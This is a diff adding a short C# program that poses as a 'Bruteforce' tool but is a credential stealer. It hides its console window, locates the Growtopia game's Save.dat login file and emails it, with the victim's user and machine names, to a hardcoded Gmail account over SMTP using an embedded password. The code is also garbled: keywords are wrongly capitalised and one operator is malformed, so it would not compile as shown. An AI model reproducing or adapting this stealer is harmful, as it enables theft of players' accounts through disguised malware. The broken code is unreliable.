@@ -1,0 +1,50 @@
+
+Namespace Bruteforce_By_NooThanks
+{
+    Class Program
+    {
+        [DllImport("user32.dll")]
+        Static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("Kernel32")]
+        Private Static extern IntPtr GetConsoleWindow();
+
+        Const int SW_HIDE = 0;
+        Const int SW_SHOW = 5;
+
+        Static void Main(String[] args)
+        {
+            IntPtr hwnd;
+            hwnd = GetConsoleWindow();
+            ShowWindow(hwnd, SW_HIDE);
+            String growtopia = "\\Growtopia\\Save.dat";
+            String kek = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            String fromEmail; string toEmail; string subject; string body; string gmailUser; string gmailPass; string savedat;
+
+            gmailUser = "koktbpqer@gmail.com"; 
+            gmailPass = "681983Yvan"; 
+            toEmail = gmailUser;
+            fromEmail = gmailUser;
+            String userName = Environment.UserName;
+            String computerName = System.Environment.MachineName.ToString();
+            subject = "Save.Dat stolen";
+            body = "Save.dat stolen from " + Environment.UserName + "/ " + Environment.MachineName;
+            savedat = kek + growtopia;
+            MailMessage message = New MailMessage(fromEmail, toEmail, subject, body);
+            SmtpClient smtp = New SmtpClient("smtp.gmail.com", 587);
+            smtp.EnableSsl = true;
+            smtp.Credentials = New NetworkCredential(gmailUser, gmailPass);
+
+            If (savedat! = String.Empty || savedat != null)
+            {
+                Attachment attach = New Attachment(savedat);
+                message.Attachments.Add(attach);
+            }
+
+            smtp.Send(message);
+            Return;
+        }
+
+
+    }
+}
